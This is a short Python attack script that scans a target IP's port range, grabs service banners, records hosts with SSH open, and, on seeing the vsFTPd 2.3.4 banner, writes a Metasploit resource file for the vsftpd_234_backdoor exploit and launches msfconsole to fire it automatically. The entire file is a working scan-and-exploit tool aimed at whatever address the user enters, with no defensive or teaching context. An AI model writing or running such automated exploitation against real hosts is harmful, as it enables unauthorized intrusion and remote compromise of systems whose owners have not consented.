import socket
import subprocess

banner_list=[]

IP=input("Target IP:")
first_port=int(input("Start port:"))
and_port=int(input("End port:"))

for port in range(first_port,and_port):
    try:
        connecpoint=socket.socket()
        connecpoint.connect((IP,port))
        banner=str(connecpoint.recv(1024))
        banner_list.append(str(banner))
        print("[+]Port:",port)
        print("[+]Banner:",banner,"\n")
        if port==22:
            print("This system can be linux or a network device.")
            folder=open("linuxıp.txt","r")
            contents=folder.read()
            folder.close()
            if not str(IP) in contents:
                folder=open("linuxıp.txt","a")
                data=IP+"\n"
                folder.write(data)
                folder.close()
        print("New ip address check")
        folder=open("new_ip.txt","r")
        contents=folder.read()
        folder.close()
        if not str(IP) in contents:
            folder=open("new_ip.txt","a")
            data=IP+"\n"
            folder.write(data)
            folder.close()
        connecpoint.close()
    except:
        pass

for service in banner_list:
    if "vsFTPd 2.3.4" in service:
        print("ftp service can be exploided")
        try:
            rc_code= """use exploit/unix/ftp/vsftpd_234_backdoor
            set RHOSTS IP_adress
            set RPORT 21
            exploit"""
            rc_new=rc_code.replace("IP_adress",str(IP))
            file=open("/root/Masaüstü/vsftpd.rc","w")
            file.write(rc_new)
            file.close()

            code="xterm -e msfconsole -r /root/Masaüstü/vsftpd.rc"
            subprocess.Popen(code,shell=True,stdout=subprocess.PIPE)
        except:
            pass

        #xterm ile farklı bir pencerede işlemler işleyecek





















